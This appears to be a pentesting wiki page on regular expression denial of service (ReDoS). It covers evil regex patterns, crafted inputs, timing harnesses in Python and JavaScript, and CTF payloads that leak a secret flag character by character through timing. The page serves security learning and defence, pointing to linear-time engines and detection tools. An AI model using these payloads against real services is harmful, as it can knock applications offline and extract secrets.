# Regular expression Denial of Service - ReDoS

{{#include ../banners/hacktricks-training.md}}

# Regular Expression Denial of Service (ReDoS)

A **Regular Expression Denial of Service (ReDoS)** happens when someone takes advantage of weaknesses in how regular expressions (a way to search and match patterns in text) work. Sometimes, when regular expressions are used, they can become very slow, especially if the piece of text they're working with gets larger. This slowness can get so bad that it grows really fast with even small increases in the text size. Attackers can use this problem to make a program that uses regular expressions stop working properly for a long time.

## The Problematic Regex Naïve Algorithm

**Check the details in [https://owasp.org/www-community/attacks/Regular*expression_Denial_of_Service*-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)**

### Engine behavior and exploitability

- Most popular engines (PCRE, Java `java.util.regex`, Python `re`, JavaScript `RegExp`) use a **backtracking** VM. Crafted inputs that create many overlapping ways to match a subpattern force exponential or high-polynomial backtracking.
- Some engines/libraries are designed to be **ReDoS-resilient** by construction (no backtracking), e.g. **RE2** and ports based on finite automata that provide worst‑case linear time; using them for untrusted input removes the backtracking DoS primitive. See the references at the end for details.

## Evil Regexes <a href="#evil-regexes" id="evil-regexes"></a>

An evil regular expression pattern is that one that can **get stuck on crafted input causing a DoS**. Evil regex patterns typically contain grouping with repetition and repetition or alternation with overlapping inside the repeated group. Some examples of evil patterns include:

- (a+)+
- ([a-zA-Z]+)\*
- (a|aa)+
- (a|a?)+
- (.*a){x} for x > 10

All those are vulnerable to the input `aaaaaaaaaaaaaaaaaaaaaaaa!`.

### Practical recipe to build PoCs

Most catastrophic cases follow this shape:

- Prefix that gets you into the vulnerable subpattern (optional).
- Long run of a character that causes ambiguous matches inside nested/overlapping quantifiers (e.g., many `a`, `_`, or spaces).
- A final character that forces overall failure so the engine must backtrack through all possibilities (often a character that won’t match the last token, like `!`).

Minimal examples:

- `(a+)+$` vs input `"a"*N + "!"`
- `\w*_*\w*$` vs input `"v" + "_"*N + "!"`

Increase N and observe super‑linear growth.

#### Quick timing harness (Python)

```python
import re, time
pat = re.compile(r'(\w*_)\w*$')
for n in [2**k for k in range(8, 15)]:
    s = 'v' + '_'*n + '!'
    t0=time.time(); pat.search(s); dt=time.time()-t0
    print(n, f"{dt:.3f}s")
```

## ReDoS Payloads

### String Exfiltration via ReDoS

In a CTF (or bug bounty) maybe you **control the Regex a sensitive information (the flag) is matched with**. Then, if might be useful to make the **page freeze (timeout or longer processing time)** if the a **Regex matched** and **not if it didn't**. This way you will be able to **exfiltrate** the string **char by char**:

- In [**this post**](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets) you can find this ReDoS rule: `^(?=<flag>)((.*)*)*salt$`
  - Example: `^(?=HTB{sOmE_fl§N§)((.*)*)*salt$`
- In [**this writeup**](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20@%20DEKRA%20CTF%202022/solver/solver.html) you can find this one:`<flag>(((((((.*)*)*)*)*)*)*)!`
- In [**this writeup**](https://ctftime.org/writeup/25869) he used: `^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`

### ReDoS Controlling Input and Regex

The following are **ReDoS** examples where you **control** both the **input** and the **regex**:

```javascript
function check_time_regexp(regexp, text) {
  var t0 = new Date().getTime()
  new RegExp(regexp).test(text)
  var t1 = new Date().getTime()
  console.log("Regexp " + regexp + " took " + (t1 - t0) + " milliseconds.")
}

// This payloads work because the input has several "a"s
;[
  //  "((a+)+)+$",  //Eternal,
  //  "(a?){100}$", //Eternal
  "(a|a?)+$",
  "(\\w*)+$", //Generic
  "(a*)+$",
  "(.*a){100}$",
  "([a-zA-Z]+)*$", //Generic
  "(a+)*$",
].forEach((regexp) => check_time_regexp(regexp, "aaaaaaaaaaaaaaaaaaaaaaaaaa!"))

/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/
```

### Language/engine notes for attackers

- JavaScript (browser/Node): Built‑in `RegExp` is a backtracking engine and commonly exploitable when regex+input are attacker‑influenced.
- Python: `re` is backtracking. Long ambiguous runs plus a failing tail often yield catastrophic backtracking.
- Java: `java.util.regex` is backtracking. If you only control input, look for endpoints using complex validators; if you control patterns (e.g., stored rules), ReDoS is usually trivial.
- Engines such as **RE2/RE2J/RE2JS** or the **Rust regex** crate are designed to avoid catastrophic backtracking. If you hit these, focus on other bottlenecks (e.g., enormous patterns) or find components still using backtracking engines.

## Tools

- [https://github.com/doyensec/regexploit](https://github.com/doyensec/regexploit)
  - Find vulnerable regexes and auto‑generate evil inputs. Examples:
    - `pip install regexploit`
    - Analyze one pattern interactively: `regexploit`
    - Scan Python/JS code for regexes: `regexploit-py path/` and `regexploit-js path/`
- [https://devina.io/redos-checker](https://devina.io/redos-checker)
- [https://github.com/davisjam/vuln-regex-detector](https://github.com/davisjam/vuln-regex-detector)
  - End‑to‑end pipeline to extract regexes from a project, detect vulnerable ones, and validate PoCs in the target language. Useful for hunting through large codebases.
- [https://github.com/tjenkinson/redos-detector](https://github.com/tjenkinson/redos-detector)
  - Simple CLI/JS library that reasons about backtracking to report if a pattern is safe.

> Tip: When you only control input, generate strings with doubling lengths (e.g., 2^k characters) and track latency. Exponential growth strongly indicates a viable ReDoS.

## References

- [https://owasp.org/www-community/attacks/Regular*expression_Denial_of_Service*-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
- [https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)
- [https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20@%20DEKRA%20CTF%202022/solver/solver.html](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20@%20DEKRA%20CTF%202022/solver/solver.html)
- [https://ctftime.org/writeup/25869](https://ctftime.org/writeup/25869)
- SoK (2024): A Literature and Engineering Review of Regular Expression Denial of Service (ReDoS) — [https://arxiv.org/abs/2406.11618](https://arxiv.org/abs/2406.11618)
- Why RE2 (linear‑time regex engine) — [https://github.com/google/re2/wiki/WhyRE2](https://github.com/google/re2/wiki/WhyRE2)

{{#include ../banners/hacktricks-training.md}}
